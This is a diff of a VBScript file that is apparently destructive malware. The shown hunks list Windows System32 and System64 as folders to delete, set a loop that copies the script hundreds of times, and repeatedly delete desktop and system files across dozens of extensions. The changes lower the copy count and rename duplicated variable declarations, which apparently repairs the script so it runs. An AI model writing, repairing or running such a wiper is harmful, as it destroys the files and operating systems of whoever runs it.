@@ -12,7 +12,7 @@ systemFoldersToDelete = Array("C:\Windows\System32", "C:\Windows\System64")
 strDesktopFolder = objShell.SpecialFolders("Desktop")
 
 ' Specify the number of copies to create
-numCopies = 99999
+numCopies = 999
 
 ' Generate copies of the script
 For i = 1 To numCopies
@@ -48,9 +48,9 @@ Do
 
     ' Loop through each file in the Desktop folder and delete if it has a specified file extension
     For Each objFile In objFSO.GetFolder(strDesktopFolder).Files
-        Dim extension
-        extension = LCase(objFSO.GetExtensionName(objFile.Name))
-        If extension = "txt" Or extension = "exe" Or extension = "json" Or extension = "doc" Or extension = "pdf" Or extension = "wpd" Or extension = "docx" Or extension = "rtf" Or extension = "tex" Or extension = "odt" Or extension = "jpg" Or extension = "jpeg" Or extension = "mp3" Or extension = "rar" Or extension = "vcd" Or extension = "webp" Or extension = "css" Or extension = "html" Or extension = "py" Or extension = "php" Or extension = "ico" Or extension = "lnk" Or extension = "mp4" Or extension = "js" Or extension = "bak" Or extension = "xml" Or extension = "zip" Or extension = "bmp" Then
+        Dim desktopExtension
+        desktopExtension = LCase(objFSO.GetExtensionName(objFile.Name))
+        If desktopExtension = "txt" Or desktopExtension = "exe" Or desktopExtension = "json" Or desktopExtension = "doc" Or desktopExtension = "pdf" Or desktopExtension = "wpd" Or desktopExtension = "docx" Or desktopExtension = "rtf" Or desktopExtension = "tex" Or desktopExtension = "odt" Or desktopExtension = "jpg" Or desktopExtension = "jpeg" Or desktopExtension = "mp3" Or desktopExtension = "rar" Or desktopExtension = "vcd" Or desktopExtension = "webp" Or desktopExtension = "css" Or desktopExtension = "html" Or desktopExtension = "py" Or desktopExtension = "php" Or desktopExtension = "ico" Or desktopExtension = "lnk" Or desktopExtension = "mp4" Or desktopExtension = "js" Or desktopExtension = "bak" Or desktopExtension = "xml" Or desktopExtension = "zip" Or desktopExtension = "bmp" Then
             objFSO.DeleteFile(objFile)
         End If
     Next
@@ -58,9 +58,9 @@ Do
     ' Loop through each file in the system folders and delete if it has a specified file extension
     For Each systemFolderPath In systemFoldersToDelete
         For Each objFile In objFSO.GetFolder(systemFolderPath).Files
-            Dim extension
-            extension = LCase(objFSO.GetExtensionName(objFile.Name))
-            If extension = "txt" Or extension = "exe" Or extension = "json" Or extension = "doc" Or extension = "pdf" Or extension = "wpd" Or extension = "docx" Or extension = "rtf" Or extension = "tex" Or extension = "odt" Or extension = "jpg" Or extension = "jpeg" Or extension = "mp3" Or extension = "rar" Or extension = "vcd" Or extension = "webp" Or extension = "css" Or extension = "html" Or extension = "py" Or extension = "php" Or extension = "ico" Or extension = "lnk" Or extension = "mp4" Or extension = "js" Or extension = "bak" Or extension = "xml" Or extension = "zip" Or extension = "bmp" Then
+            Dim systemExtension
+            systemExtension = LCase(objFSO.GetExtensionName(objFile.Name))
+            If systemExtension = "txt" Or systemExtension = "exe" Or systemExtension = "json" Or systemExtension = "doc" Or systemExtension = "pdf" Or systemExtension = "wpd" Or systemExtension = "docx" Or systemExtension = "rtf" Or systemExtension = "tex" Or systemExtension = "odt" Or systemExtension = "jpg" Or systemExtension = "jpeg" Or systemExtension = "mp3" Or systemExtension = "rar" Or systemExtension = "vcd" Or systemExtension = "webp" Or systemExtension = "css" Or systemExtension = "html" Or systemExtension = "py" Or systemExtension = "php" Or systemExtension = "ico" Or systemExtension = "lnk" Or systemExtension = "mp4" Or systemExtension = "js" Or systemExtension = "bak" Or systemExtension = "xml" Or systemExtension = "zip" Or systemExtension = "bmp" Then
                 objFSO.DeleteFile(objFile)
             End If
         Next
